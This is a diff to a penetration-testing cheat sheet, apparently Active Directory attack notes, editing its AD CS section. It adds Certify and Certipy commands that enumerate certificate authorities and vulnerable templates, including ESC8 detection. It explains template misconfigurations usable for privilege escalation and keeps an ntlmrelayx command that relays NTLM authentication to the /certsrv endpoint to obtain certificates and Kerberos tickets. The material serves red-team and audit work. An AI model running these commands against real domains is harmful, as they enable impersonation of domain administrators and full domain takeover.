@@ -1859,18 +1859,36 @@ ls \\<COMPOTERNAME FQDN>\C$
  
 ## Active Directory Certificate Services
 - Whitepaper https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
+- https://www.thehacker.recipes/ad/movement/ad-cs
 - https://github.com/GhostPack/Certify
+- https://github.com/ly4k/Certipy
 
 #### Find AD CS Certificate authorities (CA's)
 ```
 .\Certify.exe cas
+
+Get-DomainGroupMember "Cert Publishers"
+```
+
+#### Get enabled templates
+```
+certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout -enabled
+```
+
+#### Enumerate vulnerabilities
+```
+certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -old-bloodhound
+certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -vulnerable -stdout
+
+.\Certify.exe find /vulnerable
 ```
 
 ### Misconfigured Certificate Templates
 - AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.
 
 #### Find misconfigured certificate templates
-- Look for ```Client Authentication``` set and who has ```Enrollment Rights``` and if ```Authorization Signatures Required``` is enabled.
+- Prerequisite: ```Client Authentication``` set and who has ```Enrollment Rights``` and if ```Authorization Signatures Required``` is disabled.
+- If a object owned has `WriteOwner`, `WriteDacl` or `WriteProperty`, then this could also be abused.
 - This configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain
 ```
 .\Certify.exe find /vulnerable
@@ -1884,7 +1902,7 @@ ls \\<COMPOTERNAME FQDN>\C$
 - Save cert + key in a cert.pem file
 
 #### Transform cert to pfx
-- Set a password, password
+- Set a password, `password`
 ```
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
@@ -1903,11 +1921,21 @@ cat cert.pfx | base64 -w 0
 #### Then load TGT and request TGS or access systems as this user.
 
 ### Relaying to ADCS HTTP Endpoints
-- AD CS services support HTTP enrolment methods and even includes a GUI.  This endpoint is usually found at http[s]://<hostname>/certsrv, and by default supports NTLM and Negotiate authentication methods.
+- ADCS services supports HTTP enrolment and has a GUI. Endpoint: `http[s]://<hostname>/certsrv` and by default supports NTLM and Negotiate authentication methods.
+- If NTLM authentication is enabled, these endpoints are vulnerable to NTLM relay attacks. A abuse method is to relay authentication of a machine to the CA to obtain a certificate and request a TGT.
+- The certificate template used needs to be configured for authentication (i.e. EKUs like Client Authentication, PKINIT Client Authentication, Smart Card Logon, Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA)) and allowing low-priv users to enroll can be abused to authenticate as any other user/machine/admin.
+- The default User and Machine/Computer templates match those criteria and are very often enabled.
+
+#### Find Vulnerable ESC8 CA's
+```
+certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -vulnerable -stdout | grep -B20 ESC8
+
+certipy find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -stdout -enabled
+```
 
 #### Start ntlmrelayx.py
 ```
-ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
+ntlmrelayx.py -t http://<IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
 ```
  
 #### Force authentication
